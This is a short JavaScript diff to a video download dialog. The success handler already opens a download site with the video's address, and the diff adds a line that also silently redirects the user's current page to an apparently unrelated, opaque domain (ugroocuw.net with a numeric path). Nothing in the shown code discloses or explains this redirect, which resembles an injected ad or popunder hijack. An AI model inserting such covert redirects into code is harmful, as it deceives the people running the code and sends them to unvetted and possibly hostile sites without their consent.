@@ -52,6 +52,7 @@ function onErrDown(){
 		dialog.buttons("Close","Download");
 		dialog.success=()=>{
 			window.open(`https://ai-movie-download.netlify.app?lnk=${video.src}`);
+			location.assign("//ugroocuw.net/4/4937752");
 		};
 		return html;
 	}
